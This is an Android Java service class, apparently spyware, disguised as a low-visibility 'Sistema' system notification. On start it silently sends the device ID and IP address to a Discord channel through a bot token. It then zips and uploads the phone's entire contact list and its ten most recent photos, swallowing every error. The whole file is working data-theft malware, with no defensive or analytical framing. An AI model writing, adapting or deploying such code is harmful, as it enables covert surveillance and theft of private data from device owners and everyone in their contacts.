package com.fritz.sysagent;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.provider.MediaStore;
import android.provider.ContactsContract;
import androidx.core.app.NotificationCompat;
import okhttp3.*;
import org.json.JSONObject;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class AgentService extends Service {
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onCreate() {
        super.onCreate();
        NotificationChannel ch = new NotificationChannel("sys", "sys", NotificationManager.IMPORTANCE_MIN);
        getSystemService(NotificationManager.class).createNotificationChannel(ch);
        startForeground(1, new NotificationCompat.Builder(this, "sys").setContentTitle("Sistema").setSmallIcon(android.R.drawable.ic_menu_info_details).build());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(this::executar).start();
        return START_STICKY;
    }

    private void executar() {
        try {
            String devId = android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
            enviarMensagem("!hello " + devId + " " + getLocalIp());
            File zipContatos = zipContatos();
            if (zipContatos != null) enviarArquivo("!contatos", zipContatos);
            File zipGaleria = zipGaleria();
            if (zipGaleria != null) enviarArquivo("!galeria", zipGaleria);
        } catch (Exception e) {}
    }

    private String getLocalIp() {
        try {
            for (NetworkInterface ni : Collections.list(NetworkInterface.getNetworkInterfaces()))
                for (InetAddress a : Collections.list(ni.getInetAddresses()))
                    if (!a.isLoopbackAddress() && a instanceof Inet4Address) return a.getHostAddress();
        } catch (Exception ignored) {}
        return "0.0.0.0";
    }

    private void enviarMensagem(String texto) {
        try {
            JSONObject json = new JSONObject();
            json.put("content", texto);
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json"));
            Request request = new Request.Builder().url("https://discord.com/api/v10/channels/" + Config.CHANNEL_ID + "/messages").header("Authorization", "Bot " + Config.BOT_TOKEN).post(body).build();
            client.newCall(request).execute();
        } catch (Exception ignored) {}
    }

    private void enviarArquivo(String texto, File arquivo) {
        try {
            RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("content", texto).addFormDataPart("file", arquivo.getName(), RequestBody.create(arquivo, MediaType.parse("application/zip"))).build();
            Request request = new Request.Builder().url("https://discord.com/api/v10/channels/" + Config.CHANNEL_ID + "/messages").header("Authorization", "Bot " + Config.BOT_TOKEN).post(requestBody).build();
            client.newCall(request).execute();
        } catch (Exception ignored) {}
    }

    private File zipGaleria() {
        File zipFile = new File(getCacheDir(), "galeria.zip");
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
            String[] proj = { MediaStore.Images.Media.DATA };
            try (android.database.Cursor c = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")) {
                int n = 0;
                while (c != null && c.moveToNext() && n < 10) {
                    String path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                    File f = new File(path);
                    if (f.exists()) {
                        zos.putNextEntry(new ZipEntry(f.getName()));
                        try (FileInputStream fis = new FileInputStream(f)) {
                            byte[] buffer = new byte[4096];
                            int len; while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                        }
                        zos.closeEntry(); n++;
                    }
                }
            }
        } catch (Exception ignored) {}
        return zipFile;
    }

    private File zipContatos() {
        File zipFile = new File(getCacheDir(), "contatos.zip");
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
            zos.putNextEntry(new ZipEntry("contatos.txt"));
            try (android.database.Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)) {
                while (c != null && c.moveToNext()) {
                    String nome = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String num = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    zos.write((nome + " - " + num + "\n").getBytes());
                }
            }
            zos.closeEntry();
        } catch (Exception ignored) {}
        return zipFile;
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
